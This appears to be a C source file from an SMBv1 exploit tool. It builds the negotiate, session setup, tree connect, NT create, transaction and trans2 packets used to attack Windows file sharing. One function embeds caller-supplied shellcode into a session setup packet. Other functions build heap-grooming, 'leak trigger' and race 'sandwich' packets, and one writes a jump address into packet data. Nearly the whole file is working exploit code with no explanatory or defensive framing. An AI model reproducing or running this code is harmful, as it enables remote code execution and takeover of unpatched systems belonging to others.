	bwsalloc(bws, NEGOTIATE_PACKET_SIZE);

	cpy(bws->pbdata, NEGOTIATE_PACKET, bws->dwsize);
	h = MAKEPSMB(bws->pbdata + 4);

	if (!cmp(bws->pbdata + 4, "\xFFSMB", 4U))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, *(DWORD*)"\xFFSMB");
#endif // _DEBUG
		return NULL;
	}

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE session_setup_packet(BUFFER IN OUT* bws, BUFFER IN* shellcode, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_SESSIONSETUP_ANDX setup = NULL;
	PREQ_NT_SESSIONSETUP_ANDX setupnt = NULL;
	BUFFER tmp[1] = { 0 };
	ANYPOINTER anyshellcodeaddr[1] = { 0 }, anybaseaddr = { 0 };

	bwsalloc(bws, SESSION_SETUP_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, SESSION_SETUP_ANDX_PACKET, SESSION_SETUP_ANDX_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	setup = (PREQ_SESSIONSETUP_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);
	setupnt = (PREQ_NT_SESSIONSETUP_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	if (GetUlong(&shellcode->dwsize) != 0x80)
	{
		bwsfree(bws);
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	if (!find_memory_pattern(bws, anyshellcodeaddr, "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc", sizeof(ULONGLONG)))
	{
		bwsfree(bws);
		SetLastError(STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	RtlCopyMemory(anyshellcodeaddr->pbpointer, shellcode->pbdata, 0x80);

	if (!cmp(bws->pbdata + 4, "\xFFSMB", 4U))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetUlong("\xFFSMB"));
#endif // _DEBUG
		return NULL;
	}

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);
	
	return bws->pbdata;
}

PBYTE tree_connect_packet(BUFFER IN OUT* bws, UNICODE_STRING* unc, WORD pid, WORD uid, WORD mid, WORD tid)
{
#pragma warning(push)
#pragma warning(disable : 6387)
	static ANYPOINTER packetbase, packetbytecount, packetend, uncaddress, svcaddress;
	BYTE tzdata[0x200] = { 0 };
	BUFFER t = { 0 }; //t.dwsize = sizeof(tzdata); t.pbdata = tzdata;
	PREQ_TREE_CONNECT_ANDX param = NULL;
	PSMB_HEADER header = NULL;
	DWORD totalpacketsize = 0, sizeafterbytecount = 0;
	WORD nbtsize = 0;

	bwsalloc(&t, 0x1000);
	cpy(t.pbdata, TREE_CONNECT_ANDX_PACKET, TREE_CONNECT_ANDX_UNC_OFFSET);
	cpy(t.pbdata + TREE_CONNECT_ANDX_UNC_OFFSET, unc->Buffer, unc->MaximumLength);

	header = MAKEPSMB(t.pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_TREE_CONNECT_ANDX)(t.pbdata + SMB_PARAM_OFFSET);


	packetbase.pvpointer = t.pbdata;
	packetbytecount.pvpointer = (&param->Bytecount);
	uncaddress.pvpointer = (t.pbdata + TREE_CONNECT_ANDX_UNC_OFFSET);
	svcaddress.pvpointer = (uncaddress.pbpointer + unc->MaximumLength);

	cpy(svcaddress.pvpointer, TREE_CONNECT_ANDX_SVC, TREE_CONNECT_ANDX_SVC_SIZE);
	packetend.pvpointer = (svcaddress.pbpointer + TREE_CONNECT_ANDX_SVC_SIZE);

	totalpacketsize = (DWORD)(packetend.address - packetbase.address);
	sizeafterbytecount = (packetend.address - packetbytecount.address);
	sizeafterbytecount -= sizeof(WORD);
	PutUshort(&nbtsize, totalpacketsize - 4);

	PutUshort(&param->Bytecount, LOWORD(sizeafterbytecount));

	PutUshort(&header->Pid, pid);
	PutUshort(&header->Uid, uid);
	PutUshort(&header->Mid, mid);
	PutUshort(&header->Tid, tid);

	PutUshort(packetbase.pbpointer + NETBIOS_SIZE_OFFSET, byteswap16(nbtsize));

	bwsalloc(bws, totalpacketsize);
	cpy(bws->pbdata, t.pbdata, totalpacketsize);
	bwsfree(&t);

	return bws->pbdata;
#pragma warning(pop)
}

PBYTE nt_create_andx_packet(BUFFER IN OUT* bws, WORD rootfid, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_NT_CREATE_ANDX param = NULL;

	bwsalloc(bws, NT_CREATE_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, NT_CREATE_ANDX_PACKET, NT_CREATE_ANDX_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + 4);
	param = (PREQ_NT_CREATE_ANDX)(bws->pbdata + 36);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE nt_create_andx_packet_custom(BUFFER IN OUT* bws, UNICODE_STRING *namedpipe, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_NT_CREATE_ANDX param = NULL;
	BUFFER tmp[1] = { 0 };
	ANYPOINTER anynamedpipe[1] = { 0 }, * anybaseaddr = NULL;
	ULONG_PTR namedpipeoffset = 0;
	
	bwsalloc(tmp, NT_CREATE_ANDX_PACKET_SIZE);
	cpy(tmp->pbdata, NT_CREATE_ANDX_PACKET, NT_CREATE_ANDX_PACKET_SIZE);

	if (!find_memory_pattern(tmp, anynamedpipe, TEXT("lsarpc"), MAKEDWORD(wcslen(TEXT("lsarpc")) * sizeof(wchar_t))))
	{
		SetLastError(STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	anybaseaddr = ((ANYPOINTER*)(&tmp->pbdata));
	namedpipeoffset = anynamedpipe->address - anybaseaddr->address;

	bwsalloc(bws, MAKEDWORD(namedpipeoffset + namedpipe->MaximumLength));
	cpy(bws->pbdata, tmp->pbdata, namedpipeoffset);
	
	cpy(bws->pbdata + namedpipeoffset, namedpipe->Buffer, namedpipe->Length);
	bwsfree(tmp);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = (PREQ_NT_CREATE_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	PutUshort(bws->pbdata + NETBIOS_SIZE_OFFSET, byteswap16(LOWORD(bws->dwsize) - 4));

	return bws->pbdata;

}

PBYTE trans_groom_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	pfnbwsallocateandcopy bwsallocateandcopy = NULL;
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION param = NULL;

	bwsallocateandcopy = (pfnbwsallocateandcopy)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsallocateandcopy");

	if (isnull(bwsallocateandcopy))
		return NULL;

	bwsallocateandcopy(bws, TRANS_GROOM_PACKET, TRANS_GROOM_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = ((PREQ_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET));

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE nt_trans_nt_rename_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	pfnbwsallocateandcopy bwsallocateandcopy = NULL;
	PSMB_HEADER h = NULL;
	PREQ_NT_TRANSACTION param = NULL;

	bwsallocateandcopy = (pfnbwsallocateandcopy)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsallocateandcopy");

	if (isnull(bwsallocateandcopy))
		return NULL;

	bwsallocateandcopy(bws, NT_TRANS_NT_RENAME_PACKET, NT_TRANS_NT_RENAME_PACKET_SIZE);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	param = ((PREQ_NT_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET));

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE nt_trans_secondary_packet_sandwitch_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	pfnbwsnew bwsnew = NULL;	pfnbwsallocateandcopy bwsallocateandcopy = NULL;	pfnbwsdelete bwsdelete = NULL;
	BUFFER* tmp = NULL;
	PSMB_HEADER smbs[0x10] = { 0 };
	PREQ_NT_TRANSACTION_SECONDARY nttrans[1] = { 0 };
	PREQ_TRANSACTION trans[0x10 - 1] = { 0 };
	ANYPOINTER smbbaseaddress[0x10] = { 0 }, * baseaddr = NULL;
	DWORD i = 0;
	unsigned status[0x2] = { 0 };

	bwsallocateandcopy = (pfnbwsallocateandcopy)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsallocateandcopy");
	bwsnew = (pfnbwsnew)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsnew");
	bwsdelete = (pfnbwsdelete)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsdelete");

	if (isnull(bwsdelete) || isnull(bwsnew) || isnull(bwsallocateandcopy) || isnull(tmp = bwsnew(1)))
		return NULL;

	bwsallocateandcopy(bws, NT_TRANS_PACKET_SANDWITCH_PACKET, NT_TRANS_PACKET_SANDWITCH_PACKET_SIZE);

	RtlCopyMemory(tmp, bws, sizeof(BUFFER));
	tmp->pbdata += 8, tmp->dwsize -= 8;
	baseaddr = ((ANYPOINTER*)(&bws->pbdata));
	
	for (i = 0; i < 0x10; i++)
	{
		if (!find_memory_pattern(tmp, smbbaseaddress + i, "\xFFSMB", 4))
		{
			PutUlong(status, STATUS_FAIL);
			SetLastError(GetUlong(status));
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			return NULL;
		}
		tmp->pbdata += 4, tmp->dwsize -= 4;

		(smbbaseaddress + i)->pbpointer -= SMB_HEADER_OFFSET;
		smbs[i] = MAKEPSMB((smbbaseaddress + i)->pbpointer + SMB_HEADER_OFFSET);
	}

	for (i = 0; i < 0x10; i++)
	{
		if (i == 0)
			*nttrans = ((PREQ_NT_TRANSACTION_SECONDARY)(smbbaseaddress[i].pbpointer + SMB_PARAM_OFFSET));
		else
			trans[i - 1] = ((PREQ_TRANSACTION)(smbbaseaddress[i].pbpointer + SMB_PARAM_OFFSET));
	
		PutUshort(&smbs[i]->Uid, uid);
		PutUshort(&smbs[i]->Tid, tid);
	}
	
	bwsdelete(&tmp);
	return bws->pbdata;
}

PBYTE nt_trans_packet_sandwitch_leak_trigger(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	BUFFER* firstpacket = NULL, * secondpacket = NULL;
	pfnbwsnew bwsnew = NULL;	
	pfnbwsdelete bwsdelete = NULL;
	pfnbwsallocateandcopy bwsallocateandcopy = NULL;

	bwsnew = (pfnbwsnew)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsnew");
	bwsdelete = (pfnbwsdelete)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsdelete");
	bwsallocateandcopy = (pfnbwsallocateandcopy)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsallocateandcopy");

	if (isnull(bwsnew) || isnull(bwsdelete))
	{	
		SetLastError(STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	firstpacket = bwsnew(2), secondpacket = firstpacket + 1;
	
	if (isnull(nt_trans_nt_rename_packet(firstpacket, pid, uid, mid, tid)) || isnull(nt_trans_secondary_packet_sandwitch_packet(secondpacket, pid, uid, mid, tid)))
	{
		if (GetUlongPtr(&firstpacket->pbdata))
			bwsfree(firstpacket);
		if (GetUlongPtr(&secondpacket->pbdata))
			bwsfree(secondpacket);
		bwsdelete(&firstpacket);
		SetLastError(STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	bwsallocateandcopy(bws, firstpacket->pbdata, firstpacket->dwsize);
	bwscat(bws, secondpacket);

	bwsfree(firstpacket);
	bwsfree(secondpacket);
	bwsdelete(&firstpacket);
	
	return bws->pbdata;
}


PBYTE trans2_query_path_info_packet_sandwich_packet(BUFFER* IN OUT bws, ULONGLONG IN jmp_addr, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	pfnbwsnew bwsnew = NULL;	pfnbwsdelete bwsdelete = NULL;	pfnbwsallocateandcopy bwsallocateandcopy = NULL;
	BUFFER* tmp = NULL;
	ANYPOINTER transdata[10] = { 0 }, baseaddress[10] = { 0 }, * racebaseaddress = NULL;
	ANYTRANSACTION_REQUEST transrequests[10] = { 0 };
	PSMB_HEADER smbs[10] = { NULL };
	const unsigned smbcount = 10;
	unsigned i = 0, status[2] = { 0 };


	bwsallocateandcopy = (pfnbwsallocateandcopy)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsallocateandcopy");
	bwsnew = (pfnbwsnew)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsnew");
	bwsdelete = (pfnbwsdelete)GetProcAddress(GetModuleHandleW(TEXT("SmbLibrary")), "bwsdelete");

	if (isnull(bwsdelete) || isnull(bwsnew) || isnull(bwsallocateandcopy) || isnull(tmp = bwsnew(1)))
		return NULL;

	bwsallocateandcopy(bws, TRANS2_QUERY_PATH_INFO_PACKET_SANDWICH_PACKET, TRANS2_QUERY_PATH_INFO_PACKET_SANDWICH_PACKET_SIZE);
	RtlCopyMemory(tmp, bws, sizeof(BUFFER));
	
	racebaseaddress = ((PANYPOINTER)(&bws->pbdata));

	for (i = 0; i < smbcount; i++)
	{
		if (!find_memory_pattern(tmp, baseaddress + i, "\xFFSMB", 4))
		{
			PutUlong(status, STATUS_FAIL);
			SetLastError(GetUlong(status));
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			return NULL;
		}
		RtlCopyMemory(tmp, bws, sizeof(BUFFER));
		tmp->pbdata = (baseaddress[i].pbpointer + 4), tmp->dwsize -= MAKEDWORD(GetUlongPtr(&tmp->pbdata) - racebaseaddress->address);
		baseaddress[i].pbpointer -= SMB_HEADER_OFFSET;
		smbs[i] = MAKEPSMB(baseaddress[i].pbpointer + SMB_HEADER_OFFSET);
	}

	for (i = 0; i < smbcount; i++)
		(transrequests + i)->pbpointer = (baseaddress + i)->pbpointer + SMB_PARAM_OFFSET; 

	i = 0;
	transdata[i].pbpointer = (MAKEPBYTE(smbs[i]) + transrequests[i].trans2->DataOffset);

	for(i = 1; i < smbcount; i++)
		transdata[i].pbpointer = (MAKEPBYTE(smbs[i]) + transrequests[i].trans2secondary->DataOffset);

	for (i = 0; i < smbcount; i++)
		PutUshort(&smbs[i]->Mid, mid);

	for (i = 2; i < smbcount; i++)
	{
		if (GetUshort(&(transrequests + i)->trans2secondary->DataCount) == 8)
			PutUlongPtr((transdata + i)->paddress, GetUlongPtr(&jmp_addr));
	}

	bwsdelete(&tmp);
	return bws->pbdata;
}



PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PRESP_TRANSACTION_INTERIM treedisconnect = NULL;

	bwsalloc(bws, TREE_DISCONNECT_PACKET_SIZE);
	cpy(bws->pbdata, TREE_DISCONNECT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	treedisconnect = (PRESP_TRANSACTION_INTERIM)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;

	bwsalloc(bws, LOGOFF_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, LOGOFF_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}


